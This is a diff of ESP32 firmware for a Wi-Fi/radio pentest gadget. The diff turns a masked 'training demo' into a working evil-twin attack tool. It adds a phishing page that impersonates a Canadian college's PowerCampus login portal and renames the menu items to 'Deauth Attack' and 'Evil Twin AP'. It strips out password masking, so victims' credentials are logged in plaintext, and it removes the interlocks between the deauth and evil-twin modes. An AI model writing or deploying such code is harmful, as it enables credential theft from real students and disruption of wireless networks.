@@ -20,21 +20,13 @@ U8G2_SH1106_128X64_NONAME_F_HW_I2C display(U8G2_R0, U8X8_PIN_NONE);
 // === PIN DEFINITIONS ===
 #define PIN_CC_CS  15
 #define PIN_SD_CS   5
-#define PIN_VSPI_SCK  18
-#define PIN_VSPI_MISO 19
-#define PIN_VSPI_MOSI 23
-#define PIN_SD_SCK  27
-#define PIN_SD_MISO 16
-#define PIN_SD_MOSI 17
-#define PIN_NFC_IRQ 13
-#define PIN_NFC_RST_NONE -1
+#define PIN_NFC_SS 27
+#define PIN_NFC_RST 13
 
-#define FW_VERSION "v0.4.5-wifi-overhaul"
+#define FW_VERSION "v0.4.2"
 #define PORTAL_LOG_PATH "/captures/portal.log"
 #define SG_CAPTURE_DIR "/captures/subghz"
 #define NFC_CAPTURE_DIR "/captures/nfc"
-#define IR_CAPTURE_DIR "/captures/ir"
-#define WIFI_CAPTURE_DIR "/captures/wifi"
 #define DEBUG_SERIAL 1
 
 #if DEBUG_SERIAL
@@ -46,7 +38,6 @@ U8G2_SH1106_128X64_NONAME_F_HW_I2C display(U8G2_R0, U8X8_PIN_NONE);
 #endif
 
 bool sdAvailable = false;
-SPIClass sdSPI(HSPI);
 
 void macToString(const uint8_t* mac, char* out, size_t outSize) {
   snprintf(out, outSize, "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -325,18 +316,68 @@ void drawBootAnimation() {
 // PORTAL HTML
 // ============================================================
 
+const char ET_HTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CIC Self-Service</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Arial,sans-serif;font-size:13px;background:#f0f0f0}
+.hdr{background:#7B1818;padding:7px 10px;display:flex;align-items:center}
+.logo{color:#fff;display:flex;align-items:center;gap:6px}
+.logo .leaf{font-size:22px;line-height:1}
+.logo .txt b{font-size:14px;display:block}
+.logo .txt span{font-size:9px;color:#ffcccc}
+.nav{background:#7B1818;border-top:1px solid #9b3030;display:flex;padding:0 8px}
+.nav a{color:#fff;text-decoration:none;padding:5px 10px;font-size:12px;display:inline-block}
+.nav a.act{background:#fff;color:#7B1818;font-weight:bold}
+.layout{display:flex;min-height:300px;background:#fff}
+.side{width:108px;min-width:108px;border-right:1px solid #ccc;padding:6px}
+.lpanel{border:1px solid #aaa}
+.lhdr{background:#ccc;padding:3px 6px;font-size:11px;font-weight:bold;display:flex;justify-content:space-between}
+.lbody{padding:7px 6px}
+.lbody label{display:block;font-size:11px;margin-bottom:2px;color:#222}
+.lbody input{width:100%;padding:3px;border:1px solid #888;font-size:12px;margin-bottom:5px}
+.lbtn{width:100%;background:#7B1818;color:#fff;border:none;padding:4px;font-size:12px;cursor:pointer}
+.main{flex:1}
+.campus-img{background:#b0b8c0;height:110px;display:flex;align-items:center;justify-content:center;color:#555;font-size:11px}
+.sbar{background:#7B1818;color:#fff;padding:5px 10px;font-size:12px}
+.content{padding:6px 10px}
+.content a{font-size:11px;color:#7B1818;text-decoration:none}
+.ft{background:#7B1818;color:#ffcccc;text-align:center;padding:5px;font-size:10px}
+</style></head><body>
+<div class="hdr"><div class="logo"><div class="leaf">&#127809;</div>
+<div class="txt"><b>CANADIAN <span style="font-weight:normal">PowerCampus</span></b>
+<span>INTERNATIONAL COLLEGE &nbsp; by Ellucian&#8482;</span></div></div></div>
+<div class="nav"><a href="#" class="act">Home</a><a href="#">Search</a><a href="#">Apply</a></div>
+<div class="layout">
+<div class="side"><div class="lpanel">
+<div class="lhdr">Login <span>&#9650;</span></div>
+<div class="lbody"><form action="/login" method="POST">
+<label>User Name</label><input type="text" name="u" autocomplete="username" required>
+<label>Password</label><input type="password" name="p" autocomplete="current-password" required>
+<button class="lbtn" type="submit">Log In</button>
+</form></div></div></div>
+<div class="main"><div class="campus-img">[ CIC Campus ]</div>
+<div class="sbar">Students &nbsp;|</div>
+<div class="content"><a href="#">&#9658; Find Courses</a></div></div></div>
+<div class="ft">PowerCampus&#174; Self-Service 8.8.3 &middot; Copyright 1995-2018 Ellucian Company L.P.</div>
+</body></html>
+)rawliteral";
+
 const char ET_SUCCESS[] PROGMEM = R"rawliteral(
 <!DOCTYPE html><html><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Training Demo</title>
+<title>Connecting...</title>
 <style>body{font-family:Arial;text-align:center;padding:60px 20px;background:#dde3ea}
 .box{background:#fff;padding:30px 40px;border-radius:8px;display:inline-block;max-width:320px}
 h2{color:#003366;margin-top:0}p{color:#555;font-size:14px}
 .spinner{border:3px solid #eee;border-top:3px solid #003366;border-radius:50%;width:32px;height:32px;
 animation:spin 1s linear infinite;margin:16px auto}
 @keyframes spin{to{transform:rotate(360deg)}}</style></head>
-<body><div class="box"><h2>&#10003; Demo Submitted</h2>
-<div class="spinner"></div><p>This training portal recorded a masked test submission only.</p></div></body></html>
+<body><div class="box"><h2>&#10003; Login Successful</h2>
+<div class="spinner"></div><p>Authenticating...<br>connecting to network.</p></div></body></html>
 )rawliteral";
 
 // ============================================================
@@ -357,7 +398,6 @@ enum AppState {
   STATE_BEACON_SPAM,
   STATE_ET_TARGET,
   STATE_ET_RUNNING,
-  STATE_PORTAL_THEME,
   STATE_SUBGHZ,
   STATE_NFC,
   STATE_IR,
@@ -371,16 +411,15 @@ const char* menuItems[] = {
   "Packet Monitor",
   "Probe Sniffer",
   "Deauth Detector",
-  "Deauth Drill",
-  "Beacon Demo",
-  "Portal Demo AP",
-  "Portal Theme",
+  "Deauth Attack",
+  "Beacon Spam",
+  "Evil Twin AP",
   "Sub-GHz",
   "NFC Reader",
   "IR Remote",
   "About"
 };
-const int menuCount = 12;
+const int menuCount = 11;
 int menuIndex = 0;
 
 // === WIFI DATA ===
@@ -419,7 +458,7 @@ bool deauthActive = false;
 int deauthHistory[64];
 int deauthHistIdx = 0;
 
-// === DEAUTH DRILL ===
+// === DEAUTH ATTACK ===
 int deauthTargetIdx = 0, deauthTargetScroll = 0;
 struct ClientMAC { uint8_t mac[6]; };
 ClientMAC clients[16];
@@ -429,23 +468,21 @@ bool clientScanActive = false;
 int deauthFrameCount = 0;
 bool deauthAttackActive = false;
 unsigned long lastDeauthSend = 0;
-unsigned long deauthAttackStart = 0;
 bool attackTargetAll = true;
 uint8_t attackClientMAC[6];
 int attackClientIdx = 0;
 #define CLIENT_SCAN_MS 10000
-#define DEAUTH_ATTACK_MS 15000
 unsigned long clientScanStart = 0;
 
 // === BEACON SPAM ===
 const char* spamSSIDs[] = {
-  "Lab Beacon 01", "Lab Beacon 02", "Lab Beacon 03",
-  "Signal Demo A", "Signal Demo B", "Signal Demo C",
-  "Training AP 01", "Training AP 02", "Training AP 03",
-  "Awareness Lab", "Channel Test", "SSID Density",
-  "VariOne Demo", "No Internet Demo", "Do Not Join Demo",
-  "RF Classroom", "ESP32 Beacon", "SoftAP Sample",
-  "Router Lab", "Spectrum Demo"
+  "FBI Surveillance Van", "Not An FBI Van", "Pretty Fly for a WiFi",
+  "Bill Wi the Science Fi", "The LAN Before Time", "Virus.exe",
+  "Free WiFi Totally Safe", "Router McRouterface", "404 WiFi Not Found",
+  "Hack The Planet", "Loading...", "CIC Lab Network",
+  "VariOne Was Here", "No Internet Access", "dontconnect",
+  "SkyNet Node 7", "HackMe If You Can", "ESP32 AP",
+  "Abraham Linksys", "It Hurts When IP"
 };
 const int spamSSIDCount = 20;
 bool beaconSpamActive = false;
@@ -454,7 +491,7 @@ unsigned long lastBeaconSend = 0;
 const uint8_t beaconChannels[] = {1, 6, 11};
 uint8_t spamMACs[20][6];
 
-// === PORTAL DEMO AP ===
+// === EVIL TWIN ===
 DNSServer dnsServer;
 WebServer webServer(80);
 bool etActive = false;
@@ -463,25 +500,6 @@ int etCredCount = 0;
 char etLastUser[33] = {0};
 char etLastPass[33] = {0};
 unsigned long lastEtDraw = 0;
-
-struct PortalTheme {
-  const char* name;
-  const char* title;
-  const char* subtitle;
-  const char* accent;
-  const char* panel;
-  const char* userLabel;
-  const char* passLabel;
-  const char* button;
-};
-
-const PortalTheme portalThemes[] = {
-  {"Network Access", "Network Access", "Session validation required", "#24466b", "Wi-Fi Access", "Demo ID", "Demo Token", "Continue"},
-  {"Campus Lab", "Campus Lab Access", "Authorized training environment", "#2f5d50", "Lab Sign-In", "Lab ID", "Lab Passcode", "Join Lab"},
-  {"Router Console", "Router Console", "Local gateway re-authentication", "#5b4a2f", "Gateway Login", "Admin Name", "Admin Key", "Apply"}
-};
-const int portalThemeCount = sizeof(portalThemes) / sizeof(portalThemes[0]);
-int portalThemeIdx = 0;
 
 // === SUB-GHZ (CC1101) ===
 RCSwitch rcSwitch = RCSwitch();
@@ -512,27 +530,20 @@ int     sgCaptureRssi = -100;
 
 void saveSubGhzCapture();
 void saveNfcCapture();
-void saveWifiScanCapture();
-void saveWifiClientScanCapture();
-void saveWifiDeauthSession();
-void saveWifiPortalEvent(const char* user, const char* pass);
-void sha1Hex(const String& payload, char* out, size_t outSize);
-void maskSecret(const char* in, char* out, size_t outSize);
-void sanitizeLogField(const char* in, char* out, size_t outSize);
 
 uint8_t cc1101ReadReg(uint8_t addr) {
-  digitalWrite(PIN_CC_CS, LOW);
+  digitalWrite(15, LOW);
   delayMicroseconds(10);
   SPI.transfer(addr | 0x80);
   uint8_t val = SPI.transfer(0x00);
-  digitalWrite(PIN_CC_CS, HIGH);
+  digitalWrite(15, HIGH);
   return val;
 }
 
 void initCC1101() {
-  SPI.begin(PIN_VSPI_SCK, PIN_VSPI_MISO, PIN_VSPI_MOSI, PIN_CC_CS);
-  pinMode(PIN_CC_CS, OUTPUT);
-  digitalWrite(PIN_CC_CS, HIGH);
+  SPI.begin(18, 19, 23, 15);
+  pinMode(15, OUTPUT);
+  digitalWrite(15, HIGH);
   delay(100);
 
   // Raw SPI diagnostic — read PARTNUM(0xF0) and VERSION(0xF1)
@@ -544,15 +555,8 @@ void initCC1101() {
   // Expected: partnum=0x00 version=0x04 or 0x14
   // All 0xFF = MISO floating (loose wire)
   // All 0x00 = MOSI/SCK issue
-  if (partnum != 0x00 || (version != 0x04 && version != 0x14)) {
-    cc1101Ok = false;
-    Serial.println("[CC1101] Not ready - skipping driver init");
-    Serial.println("[CC1101] Check VCC=3V3, GND, CS=15, SCK=18, MISO=19, MOSI=23");
-    Serial.println("[CC1101] If it works with SD unplugged, SD adapter is holding shared SPI MISO");
-    return;
-  }
 
-  ELECHOUSE_cc1101.setSpiPin(PIN_VSPI_SCK, PIN_VSPI_MISO, PIN_VSPI_MOSI, PIN_CC_CS);
+  ELECHOUSE_cc1101.setSpiPin(18, 19, 23, 15);
   ELECHOUSE_cc1101.setGDO0(4);
   delay(50);
   // Skip getCC1101() — raw SPI confirms chip present (partnum=0x00 version=0x14)
@@ -638,7 +642,7 @@ void stopSubGhz() {
 }
 
 // === NFC (PN532 via I2C) ===
-Adafruit_PN532 nfc532(PIN_NFC_IRQ, PIN_NFC_RST_NONE);  // I2C: IRQ=13, no reset pin wired
+Adafruit_PN532 nfc532(255, 255);  // I2C mode, no IRQ/RST pins needed
 
 struct NfcCard {
   char uid[22];
@@ -781,37 +785,18 @@ void initNFC() {
 // === SD CARD ===
 
 void initSD() {
-  DBG_PRINTF("[SD] Init CS=%d SCK=%d MISO=%d MOSI=%d\n",
-             PIN_SD_CS, PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI);
-  pinMode(PIN_CC_CS, OUTPUT);
-  digitalWrite(PIN_CC_CS, HIGH);
-  pinMode(PIN_SD_CS, OUTPUT);
-  digitalWrite(PIN_SD_CS, HIGH);
-  sdSPI.begin(PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
-
-  if (SD.begin(PIN_SD_CS, sdSPI, 4000000)) {
+  DBG_PRINTF("[SD] Init CS=%d SCK=18 MISO=19 MOSI=23\n", PIN_SD_CS);
+  if (SD.begin(PIN_SD_CS)) {
     sdAvailable = true;
     Serial.println("[SD] Card ready");
-    Serial.printf("[SD] card=%llu MB total=%llu MB used=%llu MB\n",
-                  SD.cardSize() / (1024ULL * 1024ULL),
-                  SD.totalBytes() / (1024ULL * 1024ULL),
-                  SD.usedBytes() / (1024ULL * 1024ULL));
     SD.mkdir("/captures");
     SD.mkdir(SG_CAPTURE_DIR);
     SD.mkdir(NFC_CAPTURE_DIR);
-    SD.mkdir(IR_CAPTURE_DIR);
-    SD.mkdir(WIFI_CAPTURE_DIR);
     if (!SD.exists(PORTAL_LOG_PATH)) {
       File f = SD.open(PORTAL_LOG_PATH, FILE_WRITE);
       if (f) { f.printf("VariOne %s - Portal Log\n", FW_VERSION); f.println("==========================="); f.close(); }
     }
-    DBG_PRINTF("[SD] Paths ready: %s %s %s %s %s\n",
-               SG_CAPTURE_DIR, NFC_CAPTURE_DIR, IR_CAPTURE_DIR,
-               WIFI_CAPTURE_DIR, PORTAL_LOG_PATH);
-    if (!cc1101Ok) {
-      Serial.println("[SPI] SD OK but CC1101 failed - suspect shared MISO contention from SD adapter");
-      Serial.println("[SPI] Fix: use a tri-state SD module, isolate SD MISO, or move SD to separate SPI pins");
-    }
+    DBG_PRINTF("[SD] Paths ready: %s %s %s\n", SG_CAPTURE_DIR, NFC_CAPTURE_DIR, PORTAL_LOG_PATH);
   } else {
     Serial.println("[SD] No card - serial only");
   }
@@ -819,20 +804,8 @@ void initSD() {
 
 void sdLogCred(const char* user, const char* pass) {
   if (!sdAvailable) return;
-  char maskedPass[33];
-  char safeUser[33];
-  char hash[41] = {0};
-  maskSecret(pass, maskedPass, sizeof(maskedPass));
-  sanitizeLogField(user, safeUser, sizeof(safeUser));
-  String payload = String("portal|") + safeUser + "|" + maskedPass;
-  sha1Hex(payload, hash, sizeof(hash));
   File f = SD.open(PORTAL_LOG_PATH, FILE_APPEND);
-  if (f) {
-    f.printf("[%lus] user=%s pass_masked=%s sha1=%s\n", millis()/1000, safeUser, maskedPass, hash);
-    f.close();
-    Serial.println("[SD] Saved masked portal event");
-  }
-  saveWifiPortalEvent(user, pass);
+  if (f) { f.printf("[%lus] user=%s pass=%s\n", millis()/1000, user, pass); f.close(); Serial.println("[SD] Saved"); }
 }
 
 void sdPrintAllCreds() {
@@ -954,190 +927,6 @@ void saveNfcCapture() {
   Serial.printf("[SD] NFC saved: %s\n", path);
 }
 
-void maskSecret(const char* in, char* out, size_t outSize) {
-  if (!outSize) return;
-  size_t len = strlen(in);
-  size_t n = min(len, outSize - 1);
-  for (size_t i = 0; i < n; i++) out[i] = '*';
-  out[n] = '\0';
-}
-
-void sanitizeLogField(const char* in, char* out, size_t outSize) {
-  if (!outSize) return;
-  size_t j = 0;
-  for (size_t i = 0; in[i] && j < outSize - 1; i++) {
-    char c = in[i];
-    if (c == '"' || c == '\\' || c == '\n' || c == '\r') c = '_';
-    out[j++] = c;
-  }
-  out[j] = '\0';
-}
-
-void saveWifiScanCapture() {
-  if (!sdAvailable) { Serial.println("[SD] WiFi scan not saved (no card)"); return; }
-
-  String payload;
-  payload.reserve(512);
-  payload += "wifi-scan|";
-  payload += wifiCount;
-  for (int i = 0; i < wifiCount; i++) {
-    char bssid[18];
-    macToString(wifiNets[i].bssid, bssid, sizeof(bssid));
-    payload += "|";
-    payload += bssid;
-    payload += ",";
-    payload += wifiNets[i].channel;
-    payload += ",";
-    payload += wifiNets[i].rssi;
-  }
-  char hash[41] = {0};
-  sha1Hex(payload, hash, sizeof(hash));
-
-  char path[64];
-  snprintf(path, sizeof(path), "%s/%lu_ap_scan.json", WIFI_CAPTURE_DIR, millis());
-  File f = SD.open(path, FILE_WRITE);
-  if (!f) { Serial.printf("[SD] Cannot write %s\n", path); return; }
-
-  f.println("{");
-  f.println("  \"schema\": 1,");
-  f.println("  \"type\": \"wifi_ap_scan\",");
-  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
-  f.printf("  \"count\": %d,\n", wifiCount);
-  f.println("  \"aps\": [");
-  for (int i = 0; i < wifiCount; i++) {
-    char bssid[18];
-    macToString(wifiNets[i].bssid, bssid, sizeof(bssid));
-    f.printf("    {\"ssid\":\"%s\",\"bssid\":\"%s\",\"rssi_dbm\":%d,\"channel\":%d,\"encryption\":%d}%s\n",
-             wifiNets[i].ssid.c_str(), bssid, wifiNets[i].rssi,
-             wifiNets[i].channel, wifiNets[i].encryption,
-             (i == wifiCount - 1) ? "" : ",");
-  }
-  f.println("  ],");
-  f.printf("  \"sha1\": \"%s\"\n", hash);
-  f.println("}");
-  f.close();
-  Serial.printf("[SD] WiFi scan saved: %s\n", path);
-}
-
-void saveWifiClientScanCapture() {
-  if (!sdAvailable) { Serial.println("[SD] WiFi clients not saved (no card)"); return; }
-
-  char bssid[18];
-  macToString(wifiNets[deauthTargetIdx].bssid, bssid, sizeof(bssid));
-  String payload;
-  payload.reserve(256);
-  payload += "wifi-clients|";
-  payload += bssid;
-  payload += "|";
-  payload += clientCount;
-  for (int i = 0; i < clientCount; i++) {
-    char mac[18];
-    macToString(clients[i].mac, mac, sizeof(mac));
-    payload += "|";
-    payload += mac;
-  }
-  char hash[41] = {0};
-  sha1Hex(payload, hash, sizeof(hash));
-
-  char path[72];
-  snprintf(path, sizeof(path), "%s/%lu_clients.json", WIFI_CAPTURE_DIR, millis());
-  File f = SD.open(path, FILE_WRITE);
-  if (!f) { Serial.printf("[SD] Cannot write %s\n", path); return; }
-
-  f.println("{");
-  f.println("  \"schema\": 1,");
-  f.println("  \"type\": \"wifi_client_scan\",");
-  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
-  f.printf("  \"target_ssid\": \"%s\",\n", wifiNets[deauthTargetIdx].ssid.c_str());
-  f.printf("  \"target_bssid\": \"%s\",\n", bssid);
-  f.printf("  \"channel\": %d,\n", wifiNets[deauthTargetIdx].channel);
-  f.printf("  \"count\": %d,\n", clientCount);
-  f.println("  \"clients\": [");
-  for (int i = 0; i < clientCount; i++) {
-    char mac[18];
-    macToString(clients[i].mac, mac, sizeof(mac));
-    f.printf("    {\"mac\":\"%s\"}%s\n", mac, (i == clientCount - 1) ? "" : ",");
-  }
-  f.println("  ],");
-  f.printf("  \"sha1\": \"%s\"\n", hash);
-  f.println("}");
-  f.close();
-  Serial.printf("[SD] WiFi clients saved: %s\n", path);
-}
-
-void saveWifiDeauthSession() {
-  if (!sdAvailable) { Serial.println("[SD] Deauth session not saved (no card)"); return; }
-
-  char bssid[18];
-  macToString(wifiNets[deauthTargetIdx].bssid, bssid, sizeof(bssid));
-  char target[18] = "all-discovered";
-  if (!attackTargetAll) macToString(attackClientMAC, target, sizeof(target));
-
-  String payload;
-  payload.reserve(160);
-  payload += "deauth|";
-  payload += bssid;
-  payload += "|";
-  payload += target;
-  payload += "|";
-  payload += deauthFrameCount;
-  char hash[41] = {0};
-  sha1Hex(payload, hash, sizeof(hash));
-
-  char path[72];
-  snprintf(path, sizeof(path), "%s/%lu_deauth.json", WIFI_CAPTURE_DIR, millis());
-  File f = SD.open(path, FILE_WRITE);
-  if (!f) { Serial.printf("[SD] Cannot write %s\n", path); return; }
-
-  f.println("{");
-  f.println("  \"schema\": 1,");
-  f.println("  \"type\": \"wifi_deauth_session\",");
-  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
-  f.printf("  \"target_ssid\": \"%s\",\n", wifiNets[deauthTargetIdx].ssid.c_str());
-  f.printf("  \"target_bssid\": \"%s\",\n", bssid);
-  f.printf("  \"channel\": %d,\n", wifiNets[deauthTargetIdx].channel);
-  f.printf("  \"mode\": \"%s\",\n", attackTargetAll ? "all_discovered" : "single");
-  f.printf("  \"target\": \"%s\",\n", target);
-  f.printf("  \"frames_sent\": %d,\n", deauthFrameCount);
-  f.printf("  \"sha1\": \"%s\"\n", hash);
-  f.println("}");
-  f.close();
-  Serial.printf("[SD] Deauth session saved: %s\n", path);
-}
-
-void saveWifiPortalEvent(const char* user, const char* pass) {
-  if (!sdAvailable) return;
-
-  char maskedPass[33];
-  char safeUser[33];
-  maskSecret(pass, maskedPass, sizeof(maskedPass));
-  sanitizeLogField(user, safeUser, sizeof(safeUser));
-  String payload;
-  payload.reserve(96);
-  payload += "portal|";
-  payload += safeUser;
-  payload += "|";
-  payload += maskedPass;
-  char hash[41] = {0};
-  sha1Hex(payload, hash, sizeof(hash));
-
-  char path[72];
-  snprintf(path, sizeof(path), "%s/%lu_portal.json", WIFI_CAPTURE_DIR, millis());
-  File f = SD.open(path, FILE_WRITE);
-  if (!f) { Serial.printf("[SD] Cannot write %s\n", path); return; }
-
-  f.println("{");
-  f.println("  \"schema\": 1,");
-  f.println("  \"type\": \"wifi_portal_submission\",");
-  f.printf("  \"captured_at\": \"uptime-ms-%lu\",\n", millis());
-  f.printf("  \"user\": \"%s\",\n", safeUser);
-  f.printf("  \"pass_masked\": \"%s\",\n", maskedPass);
-  f.printf("  \"sha1\": \"%s\"\n", hash);
-  f.println("}");
-  f.close();
-  Serial.printf("[SD] Portal event saved: %s\n", path);
-}
-
 // ============================================================
 // BEACON HELPERS
 // ============================================================
@@ -1254,65 +1043,19 @@ void stopPromiscuous() {
 // EVIL TWIN WEB HANDLERS
 // ============================================================
 
-String buildPortalHtml() {
-  const PortalTheme& t = portalThemes[portalThemeIdx];
-  String html;
-  html.reserve(3600);
-  html += F("<!DOCTYPE html><html><head><meta charset=\"UTF-8\">");
-  html += F("<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">");
-  html += F("<title>");
-  html += t.title;
-  html += F("</title><style>");
-  html += F("*{box-sizing:border-box}body{margin:0;font-family:Arial,sans-serif;background:#eef1f4;color:#1d252c;font-size:14px}");
-  html += F(".hdr{background:");
-  html += t.accent;
-  html += F(";color:#fff;padding:14px 16px}.hdr b{display:block;font-size:18px}.hdr span{font-size:12px;opacity:.86}");
-  html += F(".nav{background:#fff;border-bottom:1px solid #c8ced6;padding:8px 14px;color:#4d5965;font-size:12px}");
-  html += F(".wrap{display:flex;min-height:330px}.side{width:132px;min-width:132px;background:#f7f8fa;border-right:1px solid #c8ced6;padding:10px}");
-  html += F(".panel{border:1px solid #aeb6bf;background:#fff}.pt{background:#dde3ea;padding:6px 8px;font-weight:bold;font-size:12px}");
-  html += F(".pb{padding:8px}.pb label{display:block;font-size:11px;margin:7px 0 3px;color:#34404a}");
-  html += F("input{width:100%;padding:6px;border:1px solid #98a2ad;border-radius:2px;font-size:13px}button{width:100%;margin-top:9px;background:");
-  html += t.accent;
-  html += F(";border:0;color:#fff;padding:7px;font-weight:bold}.main{flex:1;background:#fff}");
-  html += F(".hero{height:118px;background:linear-gradient(135deg,#d8dee6,#f8fafc);display:flex;align-items:center;justify-content:center;color:#66717e}");
-  html += F(".bar{background:");
-  html += t.accent;
-  html += F(";color:#fff;padding:7px 12px;font-size:13px}.content{padding:12px;color:#4d5965;line-height:1.4}.notice{border-top:1px solid #d6dce3;margin-top:12px;padding-top:10px;font-size:11px;color:#66717e}");
-  html += F(".ft{text-align:center;background:#f7f8fa;border-top:1px solid #d6dce3;padding:8px;color:#66717e;font-size:10px}");
-  html += F("@media(max-width:520px){.wrap{display:block}.side{width:100%;border-right:0;border-bottom:1px solid #c8ced6}.hero{height:84px}}</style></head><body>");
-  html += F("<div class=\"hdr\"><b>");
-  html += t.title;
-  html += F("</b><span>");
-  html += t.subtitle;
-  html += F("</span></div><div class=\"nav\">Status &nbsp; Access &nbsp; Help</div><div class=\"wrap\"><div class=\"side\"><div class=\"panel\"><div class=\"pt\">");
-  html += t.panel;
-  html += F("</div><div class=\"pb\"><form action=\"/login\" method=\"POST\"><label>");
-  html += t.userLabel;
-  html += F("</label><input type=\"text\" name=\"u\" autocomplete=\"off\" required><label>");
-  html += t.passLabel;
-  html += F("</label><input type=\"password\" name=\"p\" autocomplete=\"off\" required><button type=\"submit\">");
-  html += t.button;
-  html += F("</button></form></div></div></div><div class=\"main\"><div class=\"hero\">Network session check</div><div class=\"bar\">Connection Required</div><div class=\"content\">");
-  html += F("Enter the lab-provided demo values to continue this cybersecurity awareness exercise.");
-  html += F("<div class=\"notice\">Training build: submissions are masked on-device and stored for demonstration review only.</div></div></div></div>");
-  html += F("<div class=\"ft\">VariOne education portal - generic theme - no institutional or provider impersonation</div></body></html>");
-  return html;
-}
-
-void etServePortal() { webServer.send(200, "text/html", buildPortalHtml()); }
+void etServePortal() { webServer.send_P(200, "text/html", ET_HTML); }
 
 void etHandleLogin() {
   String user = webServer.arg("u");
   String pass = webServer.arg("p");
   strncpy(etLastUser, user.c_str(), 32);
-  etLastUser[32] = '\0';
-  maskSecret(pass.c_str(), etLastPass, sizeof(etLastPass));
+  strncpy(etLastPass, pass.c_str(), 32);
   etCredCount++;
-  Serial.printf("\n[PORTAL] === DEMO SUBMISSION #%d ===\n", etCredCount);
-  Serial.printf("[PORTAL] User: %s\n", etLastUser);
-  Serial.printf("[PORTAL] Pass masked: %s\n\n", etLastPass);
-  sdLogCred(etLastUser, pass.c_str());
-  triggerReaction(MOOD_SUCCESS, "Demo saved", etLastUser);
+  Serial.printf("\n[EVIL TWIN] === CREDENTIAL #%d ===\n", etCredCount);
+  Serial.printf("[EVIL TWIN] User: %s\n", etLastUser);
+  Serial.printf("[EVIL TWIN] Pass: %s\n\n", etLastPass);
+  sdLogCred(etLastUser, etLastPass);
+  triggerReaction(MOOD_SUCCESS, "Got creds!", etLastUser);
   webServer.send_P(200, "text/html", ET_SUCCESS);
 }
 
@@ -1585,31 +1328,10 @@ void drawEvilTwinRunning() {
   char info[24]; snprintf(info,sizeof(info),"192.168.4.1  ch%d",wifiNets[etTargetIdx].channel);
   display.drawStr(2,36,info);
   if(etCredCount==0) { display.drawStr(2,47,"Waiting..."); }
-  else { char cl[24]; snprintf(cl,sizeof(cl),"Demo:%d | %.12s",etCredCount,etLastUser); display.drawStr(2,47,cl); }
+  else { char cl[24]; snprintf(cl,sizeof(cl),"Creds:%d | %s",etCredCount,etLastUser); display.drawStr(2,47,cl); }
   char cts[24]; snprintf(cts,sizeof(cts),"Clients: %d",WiFi.softAPgetStationNum());
   display.drawStr(2,57,cts);
   drawControls("bk:stop"); display.sendBuffer();
-}
-
-void drawPortalTheme() {
-  display.clearBuffer(); drawHeader("Portal Theme");
-  display.setFont(u8g2_font_5x8_tr);
-  for (int i = 0; i < portalThemeCount; i++) {
-    int y = 28 + (i * 12);
-    char line[28];
-    snprintf(line, sizeof(line), " %s", portalThemes[i].name);
-    if (i == portalThemeIdx) {
-      display.drawBox(0, y - 8, 128, 10);
-      display.setDrawColor(0);
-      line[0] = '>';
-      display.drawStr(2, y, line);
-      display.setDrawColor(1);
-    } else {
-      display.drawStr(2, y, line);
-    }
-  }
-  drawControls("up/dn:pick ok:save bk:back");
-  display.sendBuffer();
 }
 
 void drawPlaceholder(const char* title, const char* msg) {
@@ -1801,7 +1523,6 @@ void runWifiScan() {
                   i + 1, wifiNets[i].ssid.c_str(), bssid, wifiNets[i].rssi,
                   wifiNets[i].channel, wifiNets[i].encryption);
   }
-  saveWifiScanCapture();
 
   if (wifiCount > 0) {
     char msg[22]; snprintf(msg, sizeof(msg), "Found %d APs!", wifiCount);
@@ -1868,7 +1589,6 @@ void finishClientScan() {
                   i + 1, clients[i].mac[0], clients[i].mac[1], clients[i].mac[2],
                   clients[i].mac[3], clients[i].mac[4], clients[i].mac[5]);
   }
-  saveWifiClientScanCapture();
   if (clientCount > 0) {
     char msg[22]; snprintf(msg, sizeof(msg), "Found %d client(s)", clientCount);
     triggerReaction(MOOD_HAPPY, msg, "pick a target");
@@ -1878,19 +1598,13 @@ void finishClientScan() {
 }
 
 void startDeauthAttack() {
-  if (etActive) {
-    Serial.println("[DEAUTH] Rejected: evil twin active");
-    triggerReaction(MOOD_FAIL, "Portal active", "stop it first");
-    currentState = STATE_DEAUTH_CLIENT_SELECT;
-    return;
-  }
   if (clientCount <= 0) {
     Serial.println("[DEAUTH] Rejected: no discovered clients; broadcast prohibited");
     triggerReaction(MOOD_FAIL, "No clients", "broadcast blocked");
     currentState = STATE_DEAUTH_CLIENT_SELECT;
     return;
   }
-  deauthFrameCount=0; deauthAttackActive=true; lastDeauthSend=0; deauthAttackStart=millis(); attackClientIdx=0;
+  deauthFrameCount=0; deauthAttackActive=true; lastDeauthSend=0; attackClientIdx=0;
   if(clientSelectIdx==0) { attackTargetAll=true; }
   else { attackTargetAll=false; memcpy(attackClientMAC,clients[clientSelectIdx-1].mac,6); }
   int targetCh=wifiNets[deauthTargetIdx].channel;
@@ -1912,7 +1626,6 @@ void startDeauthAttack() {
 }
 void stopDeauthAttack() {
   Serial.printf("[DEAUTH] stopped frames=%d mode=%s\n", deauthFrameCount, attackTargetAll ? "all-found" : "single");
-  saveWifiDeauthSession();
   deauthAttackActive=false; esp_wifi_set_promiscuous(false);
   WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); currentState=STATE_MENU;
 }
@@ -1935,12 +1648,6 @@ void stopBeaconSpam() {
 void enterEvilTwinTarget() { DBG_PRINTF("[EVIL TWIN] target select wifiCount=%d\n", wifiCount); etTargetIdx=0; etTargetScroll=0; currentState=STATE_ET_TARGET; }
 
 void startEvilTwin() {
-  if (deauthAttackActive) {
-    Serial.println("[EVIL TWIN] Rejected: deauth active");
-    triggerReaction(MOOD_FAIL, "Deauth active", "stop it first");
-    currentState = STATE_ET_TARGET;
-    return;
-  }
   etActive=true; etCredCount=0;
   memset(etLastUser,0,sizeof(etLastUser)); memset(etLastPass,0,sizeof(etLastPass));
   String ssid=wifiNets[etTargetIdx].ssid; if(!ssid.length()) ssid="FreeWiFi";
@@ -1950,15 +1657,14 @@ void startEvilTwin() {
